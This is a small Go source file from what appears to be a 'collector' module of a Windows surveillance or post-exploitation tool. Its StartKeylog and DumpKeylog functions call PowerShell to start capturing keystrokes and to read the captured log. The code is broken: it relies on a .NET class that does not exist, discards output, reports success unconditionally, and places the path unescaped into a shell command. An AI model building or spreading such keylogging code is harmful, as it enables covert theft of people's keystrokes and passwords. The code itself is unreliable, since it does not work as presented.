package collector

import "os/exec"

type KeylogResult struct {
	Status string
	Path   string
}

func StartKeylog(path string) KeylogResult {
	cmd := exec.Command("powershell", "-Command", "Add-Type -AssemblyName System.Windows.Forms; $hook = New-Object System.Windows.Forms.KeyLogger; $hook.Start()")
	cmd.Run()
	return KeylogResult{Status: "success", Path: path}
}

func DumpKeylog(path string) KeylogResult {
	cmd := exec.Command("powershell", "-Command", "Get-Content '"+path+"'")
	cmd.Run()
	return KeylogResult{Status: "success", Path: path}
}
